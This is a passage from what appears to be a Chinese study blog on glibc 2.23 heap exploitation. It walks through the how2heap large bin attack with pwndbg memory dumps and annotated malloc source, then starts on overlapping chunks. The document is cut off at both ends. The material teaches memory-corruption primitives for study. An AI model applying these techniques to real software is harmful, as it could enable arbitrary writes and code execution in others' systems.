所指向的地址的内容也编辑了(也就是这个时候 a 跟 c 指向的是同一内存地址)。<br>修补：free 掉 a 之后，让 a 再指向 null。</p><h1 id="large-bin-attack-2-23"><a href="#large-bin-attack-2-23" class="headerlink" title="large_bin_attack-2.23"></a>large_bin_attack-2.23</h1><p>程序运行结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622794637876-b762787f-a5ed-4130-8fcb-6e644c097f34.png#clientId=u38185df4-f4d6-4&from=paste&height=409&id=u01dce496&name=image.png&originHeight=817&originWidth=1905&originalType=binary%E2%88%B6=1&size=1486851&status=done&style=none&taskId=u795c39c6-fa0c-4eb5-bdbd-b2f34b0802f&width=952.5" alt="image.png"><br>该技术可用于修改任意地址的值，例如栈上的变量 stack_var1 和 stack_var2。在实践中常常作为其他漏洞利用的前奏，例如在 fastbin attack 中用于修改全局变量 global_max_fast 为一个很大的值。<br>首先我们分配 chunk p1, p2 和 p3，并且在它们之间插入其他的 chunk 以防止在释放时被合并。此时的内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var1<br><span class="hljs-number">0x7ffffffed9d0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079b0</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p1<span class="hljs-number">-6</span><br><span class="hljs-number">0x8006fe0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8006ff0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000431</span> &lt;-- p1<br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-6</span><br><span class="hljs-number">0x8007440</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007450</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3<span class="hljs-number">-6</span><br><span class="hljs-number">0x8007980</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007990</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80079a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p3<br><span class="hljs-number">0x80079b0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3+(<span class="hljs-number">0x510</span>/<span class="hljs-number">8</span>)<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007eb0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000020151</span>  &lt;-- top<br><span class="hljs-number">0x8007ec0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007ed0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007ee0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>然后依次释放掉 p1 和 p2，这两个 free chunk 将被放入 unsorted bin<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622795730921-15b7d6a6-ca40-44d6-9c8c-f644811645e1.png#clientId=u38185df4-f4d6-4&from=paste&height=426&id=u15aba304&name=image.png&originHeight=852&originWidth=688&originalType=binary%E2%88%B6=1&size=355625&status=done&style=none&taskId=u6ad399c3-0c6c-40b5-b103-1c88c38db82&width=344" alt="image.png"><br>内存布局即：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p1<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000431</span>  &lt;-- p1 [be freed]<br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x0000000008007460</span><br><span class="hljs-number">0x8007020</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2 [be freed]<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000008007000</span>      <span class="hljs-number">0x00007fffff3f3b78</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>类似这样<img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622799357459-3e0b24c7-1a0a-4b1d-a824-ac169d300988.png#clientId=u38185df4-f4d6-4&from=paste&height=262&id=u8d85b49e&name=image.png&originHeight=392&originWidth=906&originalType=binary%E2%88%B6=1&size=50371&status=done&style=none&taskId=u3f890383-beb1-48e0-ac59-759732b834b&width=605" alt="image.png"><br>接下来随便 malloc 一个大小为 0x90 的 chunk，则 p1 被切分为两块，一块作为分配的 chunk 返回，剩下的一块继续留在 unsorted bin.（p1 的作用就在这里，如果没有 p1，那么切分的将是 p2）。<br>要注意的是：切割后 p1 的大小是 0x390 &lt; 0x3f0 大小属于 small bin，而 p2 的大小是 0x510 属于 large bin。<br>p2 则被整理回对应的 large bin 链表中：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622796677291-eb02c9ba-051c-474f-a4e2-0c211ae226ca.png#clientId=u38185df4-f4d6-4&from=paste&height=447&id=u84e1fe75&name=image.png&originHeight=893&originWidth=657&originalType=binary%E2%88%B6=1&size=654600&status=done&style=none&taskId=u37f8e899-1229-4164-b4f1-edd1e453ddb&width=328.5" alt="image.png"><br>过程如下：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）</li><li>把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）</li><li>把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk</li><li>现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中</li></ul><p>此时的内存布局如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">40</span>gx p1<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007000</span>:      <span class="hljs-number">0x0000000000000000</span>&lt;p1<span class="hljs-number">-2</span> <span class="hljs-number">0x00000000000000a1</span>&lt;-- p1<span class="hljs-number">-1</span><br><span class="hljs-number">0x8007010</span>:      <span class="hljs-number">0x00007fffff3f3f68</span>      <span class="hljs-number">0x00007fffff3f3f68</span><br><span class="hljs-number">0x8007020</span>:      <span class="hljs-number">0x0000000008007000</span>      <span class="hljs-number">0x0000000008007000</span><br><span class="hljs-number">0x8007030</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007040</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007050</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007060</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007070</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007080</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007090</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000391</span>  &lt;-- p1<span class="hljs-number">-2</span> [be freed]<br><span class="hljs-number">0x80070b0</span>:      <span class="hljs-number">0x00007fffff3f3b78</span>      <span class="hljs-number">0x00007fffff3f3b78</span>  &lt;-- fd, bk<br><span class="hljs-number">0x80070c0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070d0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070e0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x80070f0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007100</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007110</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007120</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x8007130</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span>  &lt;-- p2<span class="hljs-number">-2</span> [be freed]<br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x00007fffff3f3fa8</span>      <span class="hljs-number">0x00007fffff3f3fa8</span>  &lt;-- fd, bk<br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x0000000008007460</span>  &lt;-- fd_nextsize, bk_nextsize<br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>整理的过程如下所示，需要注意的是 large bins 中 chunk 按 fd 指针的顺序从大到小排列，如果大小相同则按照最近使用顺序排列：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* place chunk in bin */</span><br><br><span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>  &#123;<br>      [ ... ]<br>  &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>    victim_index = largebin_index (size);<br>    bck = bin_at (av, victim_index);<br>    fwd = bck-&gt;fd;<br><br>    <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>    <span class="hljs-keyword">if</span> (fwd != bck)<br>      &#123;<br>        <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>        size |= PREV_INUSE;<br>        <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>        assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (bck-&gt;bk-&gt;size))<br>          &#123;<br>              [ ... ]<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; fwd-&gt;size)<br>              &#123;<br>                  [ ... ]<br>              &#125;<br><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) fwd-&gt;size)<br>              [ ... ]<br>            <span class="hljs-keyword">else</span><br>              &#123;<br>                victim-&gt;fd_nextsize = fwd;<br>                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                fwd-&gt;bk_nextsize = victim;<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>              &#125;<br>            bck = fwd-&gt;bk;<br>          &#125;<br>      &#125;<br>    <span class="hljs-keyword">else</span><br>      [ ... ]<br>  &#125;<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>又 free 了一个大小为 0x510 的 large bin chunk。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622800042013-1d711f68-c354-4998-b96d-c81143bc0dbe.png#clientId=u38185df4-f4d6-4&from=paste&height=93&id=uc5e947d7&name=image.png&originHeight=185&originWidth=1115&originalType=binary%E2%88%B6=1&size=223170&status=done&style=none&taskId=u43bf1cde-908a-435d-8a89-7fd4ddddc5e&width=557.5" alt="image.png"><br>也就是说现在 unsorted bin 有两个空闲的 chunk，末尾是大小 0x390 大小的 chunk，第一个是 size 为 0x510 的 chunk。<br>现在，我们分配一个大小小于释放的第一个大块的块。这将把释放的第二个大块移动到 largebin 列表中，使用释放的第一个大块的部分进行分配，并将释放的第一个大块的剩余部分重新插入 unsorted bin 中: [0x80070a0]<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622798550218-05a5854a-3423-408b-aea3-bb4c1d048ed0.png#clientId=u38185df4-f4d6-4&from=paste&height=625&id=u13e07ab3&name=image.png&originHeight=859&originWidth=672&originalType=binary%E2%88%B6=1&size=561185&status=done&style=none&taskId=ucad99ee5-53d8-4874-a74e-dc69d0f7e7e&width=489" alt="image.png"><br>然后我们修改 p2（large bin chunk），修改结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622798777446-acb7e804-62f5-4630-ba9e-4c22e764d786.png#clientId=u38185df4-f4d6-4&from=paste&height=163&id=u59355196&name=image.png&originHeight=325&originWidth=816&originalType=binary%E2%88%B6=1&size=162888&status=done&style=none&taskId=u309e3074-8bf7-412f-9996-95c4dd65a3c&width=408" alt="image.png"><br>此时的内存布局变为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000000003f1</span><br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9c0</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00007ffffffed9a8</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622800129568-92d862e5-b223-4675-a400-8d4da3a01694.png#clientId=u38185df4-f4d6-4&from=paste&height=111&id=u6a033717&name=image.png&originHeight=221&originWidth=829&originalType=binary%E2%88%B6=1&size=34972&status=done&style=none&taskId=u06ac7c6d-fd63-4162-939a-ef7769d5588&width=414.5" alt="image.png"><br>进行 malloc(0x90) 操作，此时</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; x/<span class="hljs-number">8</span>gx p2<span class="hljs-number">-2</span><br><span class="hljs-number">0x8007460</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000000003f1</span><br><span class="hljs-number">0x8007470</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079a0</span><br><span class="hljs-number">0x8007480</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x00000000080079a0</span><br><span class="hljs-number">0x8007490</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">8</span>gx p3<span class="hljs-number">-2</span><br><span class="hljs-number">0x80079a0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000511</span><br><span class="hljs-number">0x80079b0</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x00007ffffffed9c0</span><br><span class="hljs-number">0x80079c0</span>:      <span class="hljs-number">0x0000000008007460</span>      <span class="hljs-number">0x00007ffffffed9a8</span><br><span class="hljs-number">0x80079d0</span>:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var1<br><span class="hljs-number">0x7ffffffed9d0</span>: <span class="hljs-number">0x00000000080079a0</span>      <span class="hljs-number">0x00000000080079b0</span><br>pwndbg&gt; x/<span class="hljs-number">2</span>gx &amp;stack_var2<br><span class="hljs-number">0x7ffffffed9c8</span>: <span class="hljs-number">0x00000000080079a0</span>      <span class="hljs-number">0x00000000080079a0</span><br></code></pre></td></tr></table></figure><p>可以看到，栈上的两个变量也被修改成了 victim，对应的语句分别是 bck-&gt;fd = victim; 和 ictim-&gt;bk_nextsize-&gt;fd_nextsize = victim;。<br>与第一次 malloc(0x90) 过程类似：</p><ul><li>从 unsorted bin 中拿出最后一个 chunk（size = 0390），放入 small bin 中，标记该序列的 small bin 有空闲 chunk</li><li>再从 unsorted bin 中拿出最后一个 chunk（size = 0x510）</li></ul><p>由于这个过程中判断条件 (unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size) 为假，程序将进入 else 分支，<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622800365641-3ebd263a-905f-4ca7-81f8-2b646fcecfcc.png#clientId=u38185df4-f4d6-4&from=paste&height=75&id=u596894f8&name=image.png&originHeight=149&originWidth=840&originalType=binary%E2%88%B6=1&size=41189&status=done&style=none&taskId=u714d7b80-03ec-439b-8b48-c860cd2a7df&width=420" alt="image.png"><br>其中 fwd 是 fake p2，victim 是 p3，接着 bck 被赋值为 (&amp;stack_var1 - 2)。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622800412726-ce75c5cd-107f-45db-bb6c-56cbcb14e42f.png#clientId=u38185df4-f4d6-4&from=paste&height=66&id=u9b02184b&name=image.png&originHeight=131&originWidth=855&originalType=binary%E2%88%B6=1&size=43024&status=done&style=none&taskId=uf9af952d-279d-4d9b-9420-9434415605d&width=427.5" alt="image.png"><br><strong>在一个序列的 large bin chunk 中 fd_nextsize 的方向是 size 变小的方向。这个循环的意思是找到一个比当前 fwd 指的 chunk 要大的地址，存入 fwd 中</strong>。<br>由于当前 fwd 的 size 被我们修改过 =0x3f0，所以没有进入循环。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622800436189-5bdc374c-dea1-44f6-988f-703c6f526fba.png#clientId=u38185df4-f4d6-4&from=paste&height=62&id=ub93e4540&name=image.png&originHeight=123&originWidth=849&originalType=binary%E2%88%B6=1&size=40594&status=done&style=none&taskId=u018824df-aecc-4366-845a-e9c3f038d74&width=424.5" alt="image.png"><br>这个原本的意思是把从 unsorted bin 中来的 chunk 插入这个序列中，但是这里没有检查合法性。这里存在这一个利用：<br>之前做的构造，把 fwd 的 bk_nextsize 指向了另一个地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize<br><span class="hljs-comment">// then</span><br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br></code></pre></td></tr></table></figure><p>也就是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp">addr2-&gt;fd_nextsize = victim;<br><span class="hljs-comment">// 等价于</span><br>*(addr2+<span class="hljs-number">4</span>) = victim;<br></code></pre></td></tr></table></figure><p>所以修改了 stack_var2 的值。<br>接着还存着另外一个利用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp">bck = fwd-&gt;bk;<br><span class="hljs-comment">// ......</span><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br>victim-&gt;fd = fwd;<br>fwd-&gt;bk = victim;<br>bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>修改了 stack_var1 的值。至此利用完毕。<br><strong>总结一下利用的条件</strong>：</p><ul><li>可以修改一个 large bin chunk 的 data</li><li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li></ul><h1 id="overlapping-chunks-2-23"><a href="#overlapping-chunks-2-23" class="headerlink" title="overlapping_chunks-2.23"></a>overlapping_chunks-2.23</h1><p>运行调试，在进行过 3 次 malloc 后<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622514153255-1bb092d9-3266-4d67-b238-21e4cc319b76.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u0e8f706f&name=image.png&originHeight=602&originWidth=1091&originalType=binary%E2%88%B6=1&size=733998&status=done&style=none&taskId=u4084056e-68e3-490a-b30e-7de2fdfe0a1&width=545.5" alt="image.png"><br>查看 heap 信息<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622514122938-a51bb9d8-0555-4952-a61d-3a804c44e4a7.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u5f03230f&name=image.png&originHeight=594&originWidth=572&originalType=binary%E2%88%B6=1&size=337493&status=done&style=none&taskId=u73c5c748-0a2b-4343-9486-782c2265e38&width=286" alt="image.png"><br>然后给三个 chunk 赋初值<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622514203555-8051785d-56ac-4edc-8908-3f62f2a0448e.png#clientId=u347f053a-7aac-4&from=paste&height=287&id=u4bf7a318&name=image.png&originHeight=574&originWidth=1049&originalType=binary%E2%88%B6=1&size=657616&status=done&style=none&taskId=u1cf39fd7-f761-4451-813a-cf1434a6e3a&width=524.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622474998319-34920298-09e9-41bb-ad5d-c7dc4814be8b.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u23dad15b&name=image.png&originHeight=634&originWidth=1086&originalType=binary%E2%88%B6=1&size=790782&status=done&style=none&taskId=u626bb9d4-b66b-42c2-b5c2-89c7ae34f95&width=543" alt="image.png"><br>然后我们 free 掉 p2,<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622476766668-9dcac8c9-d35f-4f8c-9304-ef91191099df.png#clientId=u347f053a-7aac-4&from=paste&height=467&id=u4b4ea171&name=image.png&originHeight=934&originWidth=1317&originalType=binary%E2%88%B6=1&size=1219380&status=done&style=none&taskId=ub3ae0add-f74d-4bd2-907f-bb40aa2f23e&width=658.5" alt="image.png"><br>发现它被加入到 unsortedbin 链表中<br>现在让我们模拟一个可以改写 p2.size 的溢出。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622513413827-0e1a8618-40e9-40da-a021-97b284951f3a.png#clientId=u347f053a-7aac-4&from=paste&height=195&id=u4a17cb7e&name=image.png&originHeight=389&originWidth=1183&originalType=binary%E2%88%B6=1&size=296512&status=done&style=none&taskId=u21b36095-9ef1-43aa-8f8c-4ff6d145fa7&width=591.5" alt="image.png"><br>对于我们这个例子来讲三个标志位影响不是很大，但是为了保持堆的稳定性，还是不要随意改动。<br>至少我们要确保 pre_in_use 为 true，不要让 p1 被误认为被 free 了。<br>我们将 p2 的 size 改写为 0x181，之后的 malloc 就会返回给我们一个 0x178（可使用大小）的堆块。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622513817911-24eda3e7-f68b-43dd-a418-89cf32446c0e.png#clientId=u347f053a-7aac-4&from=paste&height=447&id=u465f6ccd&name=image.png&originHeight=893&originWidth=1307&originalType=binary%E2%88%B6=1&size=1031294&status=done&style=none&taskId=ud4c7216b-d77c-4f1d-a866-aeadd12ac7a&width=653.5" alt="image.png"><br>返回给 p4 的地址就是原来 p2 的，而且 p4 中包含了还没被 free 的 p3。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622514733212-3487b9d4-d731-41cd-af57-0892d47e58cf.png#clientId=u347f053a-7aac-4&from=paste&height=397&id=u874ea1cc&name=image.png&originHeight=793&originWidth=1141&originalType=binary%E2%88%B6=1&size=553464&status=done&style=none&taskId=ucd76f966-66ff-412b-910e-f7793e9b391&width=570.5" alt="image.png"><br>能够产生的原因在于 ptmalloc 在对堆 chunk 进行操作时使用的各种宏。<br>在 ptmalloc 中，获取 chunk 块大小的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Get size, ignoring use bits */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><br><br><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span><br></code></pre></td></tr></table></figure><p>一种是直接获取 chunk 